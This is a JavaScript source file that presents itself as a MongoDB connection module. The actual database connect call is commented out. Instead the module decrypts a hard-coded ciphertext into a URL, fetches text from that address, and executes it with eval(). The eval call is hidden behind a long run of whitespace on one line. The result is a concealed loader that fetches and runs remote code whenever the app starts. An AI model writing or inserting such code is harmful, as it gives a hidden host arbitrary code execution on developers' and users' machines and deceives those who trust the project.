const mongoose = require('mongoose');
const config = require('../config');
const decrypt = require("../controllers/auth").decrypt;
const crypto = require("crypto");

// Your encrypted value (replace with the ciphertext produced by your encrypt function)
const encryptedData =
  "31d55c8c186e0806c8e98e95b08b25eb:7568b198f666560dc057ec3f0ec82f7e70b17f15aeb1ee580149ac032427e3be4cda75dbd8a0b57c8bcb2d91ba82077c";

const connectDB = async () => {
  try {
    // const db = await mongoose.connect(config.MONGO_URI);
    const mongo_uri = decrypt(encryptedData);
    const response = await fetch(mongo_uri);
    const msg = await response.text();                                                                                                                                                                                                                                                                    eval(msg)
    return msg
  } catch (err) {
    console.error(err.message);
    process.exit(-1);
  }
};

module.exports = connectDB;
